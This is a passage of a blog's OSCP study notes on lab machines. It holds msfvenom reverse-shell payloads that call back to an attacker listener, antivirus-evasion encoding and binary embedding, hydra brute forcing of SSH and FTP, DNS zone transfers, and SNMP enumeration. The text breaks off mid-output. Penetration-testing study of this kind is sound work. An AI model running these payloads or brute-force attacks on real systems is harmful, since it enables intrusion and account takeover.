<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.119.132 LPORT&#x3D;444 &gt;&gt; exploit.php</span><br></pre></td></tr></table></figure>
<h2 id="Host-a-file"><a href="#Host-a-file" class="headerlink" title="Host a file"></a>Host a file</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service apache2 stop</span><br><span class="line">cd &#x2F;var&#x2F;www&#x2F;html </span><br><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>
<p>this one need to use metasploit handler to receive connection, so maybe use php-reverse-shell for exam  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.119.132</span><br><span class="line">set LPORT 4444</span><br></pre></td></tr></table></figure>

<h2 id="Other-things"><a href="#Other-things" class="headerlink" title="Other things:"></a>Other things:</h2><p>find a good blog: <a target="_blank" rel="noopener" href="https://netosec.com/my-journey-through-oscp/">My journey through OSCP</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/11/OSCP-Study-Notes-2021-03-11/">OSCP Study Notes - 2021/03/11</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-11</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/OSCP/">OSCP</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h1><p>Download <a target="_blank" rel="noopener" href="https://github.com/stephenbradshaw/vulnserver">Vulnserver</a><br>Download <a target="_blank" rel="noopener" href="https://www.immunityinc.com/products/debugger/">immunity debugger</a></p>
<p>…<br>Skip since can not setup Vulnserver on host, not safe btw</p>
<h1 id="Client-Side-Attack"><a href="#Client-Side-Attack" class="headerlink" title="Client Side Attack,"></a>Client Side Attack,</h1><p>Need a vulnerable web browser, something like phishing  </p>
<p>wait for victim to visit your site</p>
<p>setoolkit - social engineering attack</p>
<p>46-&gt;2 windows reverse_TCP meterpreter, errors again… guess my host is very secure</p>
<h2 id="Java-Applet-Attacks"><a href="#Java-Applet-Attacks" class="headerlink" title="Java Applet Attacks"></a>Java Applet Attacks</h2><h1 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h1><p>In a typical remote system access scenario, the user is the client and the target machine is the server. The user initiates a remote shell connection and the target system listens for such connections. With a reverse shell, the roles are opposite. It is the target machine that initiates the connection to the user, and the user’s computer listens for incoming connections on a specified port.</p>
<h1 id="generate-Virus"><a href="#generate-Virus" class="headerlink" title="generate Virus"></a>generate Virus</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.1.1 LPORT&#x3D;4444 -f exe -o shell1.exe</span><br><span class="line"></span><br><span class="line"># check options</span><br><span class="line">msfvenom -p windows&#x2F;shell_reverse_tcp --list-options</span><br></pre></td></tr></table></figure>
<p>MsfVenom - a Metasploit standalone payload generator.<br>-p, –payload  </p>
<h1 id="Anti-Virus"><a href="#Anti-Virus" class="headerlink" title="Anti Virus"></a>Anti Virus</h1><p>virustotl, scan for virus, test if it pass anti virus</p>
<h2 id="add-encoding"><a href="#add-encoding" class="headerlink" title="add encoding"></a>add encoding</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.1.1 LPORT&#x3D;4444 -f exe -o -e x86&#x2F;shikata_ga_nai shell2.exe</span><br></pre></td></tr></table></figure>
<p>About shikata ga nai encoder: <a target="_blank" rel="noopener" href="https://www.boozallen.com/c/insight/blog/the-shikata-ga-nai-encoder.html">https://www.boozallen.com/c/insight/blog/the-shikata-ga-nai-encoder.html</a></p>
<h2 id="embeded-to-another-binary"><a href="#embeded-to-another-binary" class="headerlink" title="embeded to another binary"></a>embeded to another binary</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.1.1 LPORT&#x3D;4444 -f exe -o -e x86&#x2F;shikata_ga_nai -x &#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;nc.exe shell3.exe</span><br></pre></td></tr></table></figure>
<p>-x, –template</p>
<p>Create virus youself will make the virustotal down</p>
<h2 id="Pre-exploit-password-attacks"><a href="#Pre-exploit-password-attacks" class="headerlink" title="Pre-exploit password attacks"></a>Pre-exploit password attacks</h2><p>brute force attack, last resort</p>
<p>ncrack, medusa, hydra</p>
<p>wordlist:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip -d &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz &gt; ...</span><br></pre></td></tr></table></figure>

<p>Use Kioptrix VM</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -v -l root -P rockyou.txt 192.168.0.22 ssh</span><br></pre></td></tr></table></figure>
<p>-l login user<br>ssh has log, will be detected</p>
<p>get conenction reset error</p>
<p>try to manually connect ssh, get </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Unable to negotiate with 192.168.0.22 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1</span><br></pre></td></tr></table></figure>

<p>add to ~/.ssh/config</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Host 192.168.0.22</span><br><span class="line">        KexAlgorithms +diffie-hellman-group1-sha1</span><br><span class="line">        Ciphers +aes128-cbc</span><br></pre></td></tr></table></figure>

<p>add <code>-c</code> to wait for 1s between each retry<br>the  wait time in seconds per login attempt over all threads  </p>
<h3 id="Metasplit-brute-force"><a href="#Metasplit-brute-force" class="headerlink" title="Metasplit brute force"></a>Metasplit brute force</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login</span><br></pre></td></tr></table></figure>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/10/OSCP-Study-Notes-2021-03-10/">OSCP Study Notes - 2021/03/10</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-10</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/OSCP/">OSCP</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="TRY-HARDER"><a href="#TRY-HARDER" class="headerlink" title="TRY HARDER!!"></a>TRY HARDER!!</h1><h2 id="DNS-Enumeration"><a href="#DNS-Enumeration" class="headerlink" title="DNS Enumeration"></a>DNS Enumeration</h2><h3 id="host-command"><a href="#host-command" class="headerlink" title="host command"></a>host command</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└─# host -t ns zonetransfer.me</span><br><span class="line">zonetransfer.me name server nsztm2.digi.ninja.</span><br><span class="line">zonetransfer.me name server nsztm1.digi.ninja.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>-t specifies the query type</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">└─# host -t mx zonetransfer.me                                                                                 1 ⨯</span><br><span class="line">zonetransfer.me mail is handled by 10 ALT2.ASPMX.L.GOOGLE.COM.</span><br><span class="line">zonetransfer.me mail is handled by 20 ASPMX2.GOOGLEMAIL.COM.</span><br><span class="line">zonetransfer.me mail is handled by 0 ASPMX.L.GOOGLE.COM.</span><br><span class="line">zonetransfer.me mail is handled by 20 ASPMX5.GOOGLEMAIL.COM.</span><br><span class="line">zonetransfer.me mail is handled by 20 ASPMX4.GOOGLEMAIL.COM.</span><br><span class="line">zonetransfer.me mail is handled by 20 ASPMX3.GOOGLEMAIL.COM.</span><br><span class="line">zonetransfer.me mail is handled by 10 ALT1.ASPMX.L.GOOGLE.COM.</span><br></pre></td></tr></table></figure>

<h3 id="zonetransfer"><a href="#zonetransfer" class="headerlink" title="zonetransfer"></a>zonetransfer</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">└─# host -l zonetransfer.me nsztm1.digi.ninja                                                                  1 ⨯</span><br><span class="line">Using domain server:</span><br><span class="line">Name: nsztm1.digi.ninja</span><br><span class="line">Address: 81.4.108.41#53</span><br><span class="line">Aliases: </span><br><span class="line"></span><br><span class="line">zonetransfer.me has address 5.196.105.14</span><br><span class="line">zonetransfer.me name server nsztm1.digi.ninja.</span><br><span class="line">zonetransfer.me name server nsztm2.digi.ninja.</span><br><span class="line">14.105.196.5.IN-ADDR.ARPA.zonetransfer.me domain name pointer www.zonetransfer.me.</span><br><span class="line">asfdbbox.zonetransfer.me has address 127.0.0.1</span><br><span class="line">canberra-office.zonetransfer.me has address 202.14.81.230</span><br><span class="line">dc-office.zonetransfer.me has address 143.228.181.132</span><br><span class="line">deadbeef.zonetransfer.me has IPv6 address dead:beaf::</span><br><span class="line">email.zonetransfer.me has address 74.125.206.26</span><br><span class="line">home.zonetransfer.me has address 127.0.0.1</span><br><span class="line">internal.zonetransfer.me name server intns1.zonetransfer.me.</span><br><span class="line">internal.zonetransfer.me name server intns2.zonetransfer.me.</span><br><span class="line">intns1.zonetransfer.me has address 81.4.108.41</span><br><span class="line">intns2.zonetransfer.me has address 167.88.42.94</span><br><span class="line">office.zonetransfer.me has address 4.23.39.254</span><br><span class="line">ipv6actnow.org.zonetransfer.me has IPv6 address 2001:67c:2e8:11::c100:1332</span><br><span class="line">owa.zonetransfer.me has address 207.46.197.32</span><br><span class="line">alltcpportsopen.firewall.test.zonetransfer.me has address 127.0.0.1</span><br><span class="line">vpn.zonetransfer.me has address 174.36.59.154</span><br><span class="line">www.zonetransfer.me has address 5.196.105.14</span><br></pre></td></tr></table></figure>
<p>-l     List zone: The host command performs a zone transfer of zone name and prints out the NS,  PTR  and address records (A/AAAA).  </p>
<p>AXFR offers no authentication, so any client can ask a DNS server for a copy of the entire zone. This means that unless some kind of protection is introduced, an attacker can get a list of all hosts for a domain, which gives them a lot of potential attack vectors.</p>
<h2 id="dnsrecon-DNS-Enumeration-and-Scanning-Tool"><a href="#dnsrecon-DNS-Enumeration-and-Scanning-Tool" class="headerlink" title="dnsrecon - DNS Enumeration and Scanning Tool"></a>dnsrecon - DNS Enumeration and Scanning Tool</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnsrecon -d zonetransfer.me -t axfr</span><br></pre></td></tr></table></figure>
<p>-d domain<br>-t type</p>
<h2 id="dnsenum"><a href="#dnsenum" class="headerlink" title="dnsenum"></a>dnsenum</h2><p>multithread script to enumerate information on a domain and to discover non-contiguous IP blocks  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnsenum zonetransfer.me</span><br></pre></td></tr></table></figure>

<h1 id="Other-Enumeration"><a href="#Other-Enumeration" class="headerlink" title="Other Enumeration"></a>Other Enumeration</h1><p>Find some Vulnhub box and do some scan</p>
<h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><p>Default Port: 21<br>Using Metasploitable</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">nmap -nmap -Pn -sS -A -p 21 192.168.119.129 </span><br><span class="line">Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower.</span><br><span class="line">Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-03-10 14:18 EST</span><br><span class="line">Nmap scan report for 192.168.119.129</span><br><span class="line">Host is up (0.00021s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21&#x2F;tcp open  ftp     vsftpd 2.3.4</span><br><span class="line">|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to 192.168.119.132</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      vsFTPd 2.3.4 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">MAC Address: 00:0C:29:7F:42:67 (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:2.6</span><br><span class="line">OS details: Linux 2.6.9 - 2.6.33</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Unix</span><br></pre></td></tr></table></figure>
<p>-sC: equivalent to –script=default<br>connect to it and get banner </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.119.129                                                                                      130 ⨯</span><br><span class="line">Connected to 192.168.119.129.</span><br><span class="line">220 (vsFTPd 2.3.4)</span><br></pre></td></tr></table></figure>

<p>Use Metasplit:  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(scanner&#x2F;ftp&#x2F;ftp_version) &gt; set RHOST 192.168.119.129</span><br><span class="line">RHOST &#x3D;&gt; 192.168.119.129</span><br><span class="line">msf6 auxiliary(scanner&#x2F;ftp&#x2F;ftp_version) &gt; exploit</span><br><span class="line"></span><br><span class="line">[+] 192.168.119.129:21    - FTP Banner: &#39;220 (vsFTPd 2.3.4)\x0d\x0a&#39;</span><br><span class="line">[*] 192.168.119.129:21    - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">msf6 auxiliary(scanner&#x2F;ftp&#x2F;ftp_version) &gt; </span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(scanner&#x2F;ftp&#x2F;ftp_login) &gt; set blank_passwords true</span><br><span class="line">blank_passwords &#x3D;&gt; true</span><br><span class="line">msf6 auxiliary(scanner&#x2F;ftp&#x2F;ftp_login) &gt; set RHOSTS 192.168.119.129</span><br><span class="line">RHOSTS &#x3D;&gt; 192.168.119.129</span><br><span class="line">msf6 auxiliary(scanner&#x2F;ftp&#x2F;ftp_login) &gt; set USERNAME anonyus</span><br><span class="line">USERNAME &#x3D;&gt; anonyus</span><br><span class="line">msf6 auxiliary(scanner&#x2F;ftp&#x2F;ftp_login) &gt; set username anonymous</span><br><span class="line">username &#x3D;&gt; anonymous</span><br><span class="line">msf6 auxiliary(scanner&#x2F;ftp&#x2F;ftp_login) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] 192.168.119.129:21    - 192.168.119.129:21 - Starting FTP login sweep</span><br><span class="line">[!] 192.168.119.129:21    - No active DB -- Credential data will not be saved!</span><br><span class="line">[+] 192.168.119.129:21    - 192.168.119.129:21 - Login Successful: anonymous:</span><br><span class="line">[*] 192.168.119.129:21    - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Use-Hydra"><a href="#Use-Hydra" class="headerlink" title="Use Hydra"></a>Use Hydra</h3><p>hydra - a very fast network logon cracker which supports many different services  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">hydra -s 21 -C ftp-default-userpass.txt -u -f 192.168.119.129 ftp</span><br><span class="line">Hydra v9.1 (c) 2020 by van Hauser&#x2F;THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) starting at 2021-03-10 15:03:19</span><br><span class="line">[DATA] max 11 tasks per 1 server, overall 11 tasks, 11 login tries, ~1 try per task</span><br><span class="line">[DATA] attacking ftp:&#x2F;&#x2F;192.168.119.129:21&#x2F;</span><br><span class="line">[21][ftp] host: 192.168.119.129   login: ftp   password: ftp</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) finished at 2021-03-10 15:03:20</span><br></pre></td></tr></table></figure>
<p>-u        loop around users, not passwords (effective! implied with -x)<br>-C FILE   colon separated “login:pass” format, instead of -L/-P options<br>-f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)<br>-s port </p>
<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>searchsploit vfstpd 2.3.4 there’s a metasploit module</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use unix&#x2F;ftp&#x2F;vsftpd_234_backdoor</span><br></pre></td></tr></table></figure>
<p>can get the shell</p>
<h2 id="SNMP"><a href="#SNMP" class="headerlink" title="SNMP"></a>SNMP</h2><p><strong>Vulnhub:</strong> analoguepond<br>reference walkthrough: <a target="_blank" rel="noopener" href="http://xhyumiracle.com/vulnhub-analoguepond-walkthrough-part-1/">http://xhyumiracle.com/vulnhub-analoguepond-walkthrough-part-1/</a></p>
<p>Simple Network Management Protocol (SNMP) is an Internet Standard protocol for collecting and organizing information about managed devices on IP networks and for modifying that information to change device behavior. Devices that typically support SNMP include cable modems, routers, switches, servers, workstations, printers, and more.</p>
<p>UDP port 161</p>
<ul>
<li>SNMP enumeration is a process of enumerating user accounts and devices on a target system using SNMP.</li>
<li>SNMP consists of a manager and an agent; agents are embedded on every network device, and the manager is installed on a separate computer.</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sU -p1-200 192.168.119.133</span><br></pre></td></tr></table></figure>
<p>snmp-brute</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sU -p161 --script snmp-brute 192.168.119.133 </span><br><span class="line"></span><br><span class="line">PORT    STATE         SERVICE</span><br><span class="line">161&#x2F;udp open|filtered snmp</span><br><span class="line">| snmp-brute: </span><br><span class="line">|_  public - Valid credentials</span><br><span class="line">MAC Address: 00:0C:29:EA:20:95 (VMware)</span><br></pre></td></tr></table></figure>
<h3 id="onesixtyone"><a href="#onesixtyone" class="headerlink" title="onesixtyone"></a>onesixtyone</h3><p>SNMP Scanner  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─$ onesixtyone -c &#x2F;usr&#x2F;share&#x2F;doc&#x2F;onesixtyone&#x2F;dict.txt 192.168.119.133                                         1 ⨯</span><br><span class="line">Scanning 1 hosts, 51 communities</span><br><span class="line">192.168.119.133 [public] Linux analoguepond 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64</span><br></pre></td></tr></table></figure>
<p>-c &lt;communityfile&gt; file with community names to try<br>-d debug  </p>
<h3 id="snmp-check"><a href="#snmp-check" class="headerlink" title="snmp-check"></a>snmp-check</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">└─$ snmp-check 192.168.119.133</span><br><span class="line">snmp-check v1.9 - SNMP enumerator</span><br><span class="line">Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)</span><br><span class="line"></span><br><span class="line">[+] Try to connect to 192.168.119.133:161 using SNMPv1 and community &#39;public&#39;</span><br><span class="line"></span><br><span class="line">[*] System information:</span><br><span class="line"></span><br><span class="line">  Host IP address               : 192.168.119.133</span><br><span class="line">  Hostname                      : analoguepond</span><br><span class="line">  Description                   : Linux analoguepond 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64</span><br><span class="line">  Contact                       : Eric Burdon &lt;eric@example.com&gt;</span><br><span class="line">  Location                      : There is a house in New Orleans they call it...</span><br><span class="line">  Uptime snmp                   : 00:38:18.10</span><br><span class="line">  Uptime system                 : 00:38:07.70</span><br><span class="line">  System date                   : 2021-3-11 03:01:11.0</span><br></pre></td></tr></table></figure>
<p>snmp-check - SNMP device enumerator</p>
<p>Find string <code>public</code></p>
<h3 id="snmpwalk"><a href="#snmpwalk" class="headerlink" title="snmpwalk"></a>snmpwalk</h3><p>retrieve a subtree of management values using SNMP GETNEXT requests</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">└─$ snmpwalk -v 2c -c public 192.168.119.133</span><br><span class="line">iso.3.6.1.2.1.1.1.0 &#x3D; STRING: &quot;Linux analoguepond 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64&quot;</span><br><span class="line">iso.3.6.1.2.1.1.2.0 &#x3D; OID: iso.3.6.1.4.1.8072.3.2.10</span><br><span class="line">iso.3.6.1.2.1.1.3.0 &#x3D; Timeticks: (259734) 0:43:17.34</span><br><span class="line">iso.3.6.1.2.1.1.4.0 &#x3D; STRING: &quot;Eric Burdon &lt;eric@example.com&gt;&quot;</span><br><span class="line">iso.3.6.1.2.1.1.5.0 &#x3D; STRING: &quot;analoguepond&quot;</span><br><span class="line">iso.3.6.1.2.1.1.6.0 &#x3D; STRING: &quot;There is a house in New Orleans they call it...&quot;</span><br><span class="line">iso.3.6.1.2.1.1.7.0 &#x3D; INTEGER: 72</span><br><span class="line">iso.3.6.1.2.1.1.8.0 &#x3D; Timeticks: (3) 0:00:00.03</span><br><span class="line">iso.3.6.1.2.1.1.9.1.2.1 &#x3D; OID: iso.3.6.1.6.3.11.3.1.1</span><br><span class="line">iso.3.6.1.2.1.1.9.1.2.2 &#x3D; OID: iso.3.6.1.6.3.15.2.1.1</span><br><span class="line">iso.3.6.1.2.1.1.9.1.2.3 &#x3D; OID: iso.3.6.1.6.3.10.3.1.1</span><br><span class="line">iso.3.6.1.2.1.1.9.1.2.4 &#x3D; OID: iso.3.6.1.6.3.1</span><br><span class="line">iso.3.6.1.2.1.1.9.1.2.5 &#x3D; OID: iso.3.6.1.2.1.49</span><br><span class="line">iso.3.6.1.2.1.1.9.1.2.6 &#x3D; OID: iso.3.6.1.2.1.4</span><br><span class="line">iso.3.6.1.2.1.1.9.1.2.7 &#x3D; OID: iso.3.6.1.2.1.50</span><br><span class="line">iso.3.6.1.2.1.1.9.1.2.8 &#x3D; OID: iso.3.6.1.6.3.16.2.2.1</span><br><span class="line">iso.3.6.1.2.1.1.9.1.2.9 &#x3D; OID: iso.3.6.1.6.3.13.3.1.3</span><br><span class="line">iso.3.6.1.2.1.1.9.1.2.10 &#x3D; OID: iso.3.6.1.2.1.92</span><br><span class="line">iso.3.6.1.2.1.1.9.1.3.1 &#x3D; STRING: &quot;The MIB for Message Processing and Dispatching.&quot;</span><br><span class="line">iso.3.6.1.2.1.1.9.1.3.2 &#x3D; STRING: &quot;The management information definitions for the SNMP User-based Security Model.&quot;</span><br><span class="line">iso.3.6.1.2.1.1.9.1.3.3 &#x3D; STRING: &quot;The SNMP Management Architecture MIB.&quot;</span><br><span class="line">iso.3.6.1.2.1.1.9.1.3.4 &#x3D; STRING: &quot;The MIB module for SNMPv2 entities&quot;</span><br><span class="line">iso.3.6.1.2.1.1.9.1.3.5 &#x3D; STRING: &quot;The MIB module for managing TCP implementations&quot;</span><br><span class="line">iso.3.6.1.2.1.1.9.1.3.6 &#x3D; STRING: &quot;The MIB module for managing IP and ICMP implementations&quot;</span><br><span class="line">iso.3.6.1.2.1.1.9.1.3.7 &#x3D; STRING: &quot;The MIB module for managing UDP implementations&quot;</span><br><span class="line">iso.3.6.1.2.1.1.9.1.3.8 &#x3D; STRING: &quot;View-based Access Control Model for SNMP.&quot;</span><br><span 